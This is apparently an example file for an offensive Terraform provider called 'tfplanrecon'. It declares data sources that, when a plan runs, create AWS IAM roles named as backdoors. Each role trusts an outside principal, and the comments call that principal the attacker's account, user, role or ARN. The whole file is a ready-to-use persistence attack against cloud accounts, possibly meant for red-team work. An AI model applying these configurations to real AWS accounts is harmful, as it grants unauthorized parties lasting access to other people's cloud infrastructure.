# AWS IAM Role Creation Example
# This data source will create an AWS IAM role with a trust policy allowing the specified principal

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Create role trusting a specific AWS account
data "tfplanrecon_aws_iam_role" "account_trust" {
  role_name     = "tfplanrecon-backdoor"
  aws_principal = "123456789012"  # Attacker's AWS account ID
  description   = "Backdoor role for account access"
}

# Create role trusting a specific user
data "tfplanrecon_aws_iam_role" "user_trust" {
  role_name     = "tfplanrecon-user-backdoor"
  aws_principal = "user:attacker"
  description   = "Backdoor role for specific user"
}

# Create role trusting another role
data "tfplanrecon_aws_iam_role" "role_trust" {
  role_name     = "tfplanrecon-cross-role"
  aws_principal = "role:existing-malicious-role"
  description   = "Cross-role trust"
}

# Create role trusting a full ARN
data "tfplanrecon_aws_iam_role" "arn_trust" {
  role_name     = "tfplanrecon-arn-backdoor"
  aws_principal = "arn:aws:iam::123456789012:user/attacker"
  description   = "Role trusting specific ARN"
}